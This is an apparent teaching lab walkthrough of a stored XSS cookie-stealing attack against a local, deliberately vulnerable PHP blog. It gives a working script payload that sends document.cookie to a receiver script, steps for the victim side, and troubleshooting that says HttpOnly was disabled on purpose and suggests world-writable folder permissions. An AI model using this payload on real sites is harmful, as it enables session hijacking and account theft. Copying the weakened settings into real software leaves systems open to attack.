# Advanced XSS: Cookie Stealing Lab

In this scenario, we will demonstrate how an attacker can steal a victim's session cookies and store them on a remote server.

## 1. Setup the Attacker's "Receiver"
The attacker needs a script to receive the stolen cookies. I have created `steal.php` for this purpose.

*   **Receiver Script:** `steal.php`
*   **Log File:** `cookies.txt` (This is where the stolen cookies will appear).

---

## 2. The Attacker: Injecting the Malicious Script
The attacker will create a new blog post containing a script that sends the viewer's cookies to the attacker's server.

1.  Login as `admin`.
2.  Go to **New Post** (`create.php`).
3.  In the **Content** field, paste the following payload:

```html
<script>
    new Image().src = "http://localhost/SQLMAP_Lab/steal.php?c=" + document.cookie;
</script>
<p>Nothing to see here, just a normal blog post!</p>
```

4.  Click **Publish Post**.

---

## 3. The Victim: Triggering the Attack
Now, simulate a victim visiting the website.

1.  **Open a DIFFERENT browser** (e.g., if you used Chrome for the attacker, use Firefox for the victim) or use a **Private/Incognito window**.
2.  Login as a user (or admin). **You MUST be logged in for there to be a cookie to steal.**
3.  Go to the **Home Page** (`index.php`).
4.  The hidden script runs instantly and sends the cookie to `steal.php`.

---

## 4. The Attacker: Harvesting the Cookies
Check the `cookies.txt` file in the project folder.

---

## 5. Troubleshooting (If it's not working)

*   **Check "HttpOnly":** I have explicitly disabled `HttpOnly` in `config.php`. If it still fails, check your `php.ini` for `session.cookie_httponly`.
*   **Browser Console:** Press `F12` and go to the **Console** and **Network** tabs in the victim's browser. Look for any errors related to `steal.php`.
*   **Empty Cookie:** If `document.cookie` shows as empty in the console, the session might not be started or the cookie is still protected by the browser.
*   **URL Path:** Ensure the URL in your payload (`http://localhost/SQLMAP_Lab/steal.php`) exactly matches where your lab is hosted. If you are using `127.0.0.1`, use that instead of `localhost`.
*   **File Permissions:** On Linux, make sure the folder is writable so PHP can create `cookies.txt`.
    ```bash
    sudo chmod 777 /var/www/html/SQLMAP_Lab
    ```
